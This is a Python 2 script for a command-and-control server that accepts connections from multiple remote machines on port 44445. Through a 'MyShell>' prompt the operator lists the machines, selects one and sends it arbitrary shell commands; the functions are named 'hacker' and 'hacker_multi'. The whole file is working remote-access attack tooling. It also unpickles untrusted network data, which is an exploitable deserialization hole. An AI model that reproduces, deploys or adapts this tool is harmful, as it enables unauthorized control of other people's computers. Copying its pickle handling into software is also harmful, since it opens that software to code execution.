#!/usr/bin/python
import os
import socket
import pickle
import re
import sys
import datetime
import subprocess
import threading
from Queue import Queue

#This program sends messages in form of list and recieves in form of list. End of message is represented by ENDDDD string in last of list.

def connect(systemip,port):
        s2=socket.socket()
        s2.connect((systemip,port))
        return s2

def listen(serverip,port):
	s=socket.socket()
	s.bind((serverip,port))
	s.listen(5)
	return s

def accept(socketm):
	c, addr=socketm.accept()
	c.setblocking(1)
	print "connection has been established with "+str(addr[0])+" from port "+str(addr[1])
	return (c,addr)

def sendmessage(connection,msg):
	msg.append("ENDDDD")
	msgs=""
	try:
		msgs=pickle.dumps(msg)
	except:
		str1="Some different format."
		msgs=pickle.dumps([str1,"ENDDDD"])	
	connection.send(msgs)
	return True

def recvmessage(connection):
	while True:
		out=connection.recv(32000)
		if(out):
			try:
				out=pickle.loads(out)
			except:
				str1="Some different format."
				out=[str1,"ENDDDD"]
		result=[]
		for each in out:
			if(re.search('ENDDDD',each)):
				break
			if(each):
				result.append(each)
			#print each
		return result

def runcommand(cmd):
	print cmd
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
	(out,err)=proc.communicate()
	print out
	result=out.split("\n")
	return result

def closeconn(conn):
	conn.close()


NUMBER_OF_THREAD=2
JOB_NUMBER=[1,2]
q=Queue()
all_connections=[]
all_addresses=[]
current_conn=None
ip='0.0.0.0'
port=44445
socketm=""


def send_commands(conn):
	while True:
		cmd = raw_input()
		if cmd== 'quit':
			return -1
		if len(cmd) > 0:
			cmds=[cmd,]
			sendmessage(conn,cmds)
			result=recvmessage(conn)
			if not result:
				continue
			for each in result[:-1]:
				print each
			print result[-1],	
			#print result,
			 	

def hacker():
	ip='0.0.0.0'
	port=44445
	socketm=listen(ip,port)
	conn=accept(socketm)[0]
	result=send_commands(conn)
	if(result==-1):
		closeconn(conn)
		closeconn(socketm)
		sys.exit(0)	

#Accept multiple client and save to list

def accept_connections():
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	global socketm

	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	s=socketm
	while True:
		try:
			conn,address=accept(s)
			all_connections.append(conn)
			all_addresses.append(address)
			print all_connections, all_addresses
		except:
			print "Error accepting Connection\n"		

#select a machine

def get_connection(cmd):
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	global socketm
	try:
		target= cmd.replace('select ','')
		target=int(target)
		conn = all_connections[target]
		print "YOu are now connected to : ", str(all_addresses[target])
		print str(all_connections[target])+'>',
		return conn
	except:
		print "Not a valid selection"
		return None

#def 

def send_target_commands(conn):
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	global socketm
	while True:
		cmd = raw_input()
		if cmd== 'quit':
			break
			return -1
		if len(cmd) > 0:
			cmds=[cmd,]
			sendmessage(conn,cmds)
			result=recvmessage(conn)
			if not result:
				continue
			for each in result[:-1]:
				print each
			print result[-1],	
			#print result,
	return 0
	

# interative promt for sending commands remotely
def start_intractive():
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	global socketm
	while True:
		try:
			cmd=raw_input('MyShell>')
			if(cmd == 'list'):
				list_connections()
				continue
			elif 'select' in cmd:
				current_conn = get_connection(cmd)
				if current_conn is not None:
					send_target_commands(current_conn)
			elif cmd == 'quit':	
				print "Came here"	
			else:
				print("Command not recognised.\n")
		except:
			print "Connection is Lost"
			list_connections()
	

def list_connections():
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	global socketm
	results=''
	for i,conn in enumerate(all_connections):
	#	print "Visited this part"
		try:
			sendmessage(conn,["pwd",])
			recvmessage(conn)
		except:
#			print "deleted this part"
			del all_connections[i]
			del all_addresses[i]
			continue
		results+=str(i) + '   ' + str(all_addresses[i][0]) + '  ' + str(all_addresses[i][1]) + '\n'
		
	print ('-----------Clients ------' + '\n' + results)



#do the next job in the queue ( one handles connection, other sends commands)
def work():
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	global socketm

	while True:
		x=q.get()
		if x==1 :
			socketm=listen(ip,port)
			accept_connections()
		if x == 2:
			start_intractive()
		q.task_done()
		
def create_worker_threads():
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	for _ in range(NUMBER_OF_THREAD):
		t = threading.Thread(target=work)
		t.daemon= True
		t.start()


#each list item is a new job

def create_jobs():
	global NUMBER_OF_THREAD
	global JOB_NUMBER
	global q
	global all_connections
	global all_addresses
	global current_conn
	global ip
	global port
	for x in JOB_NUMBER:
		q.put(x)
	q.join()


def hacker_multi():
	create_worker_threads()
	create_jobs()		

def main():
	global port
	print port
	if(len(sys.argv) > 1):
		port=int(sys.argv[1])
	hacker_multi()


main()
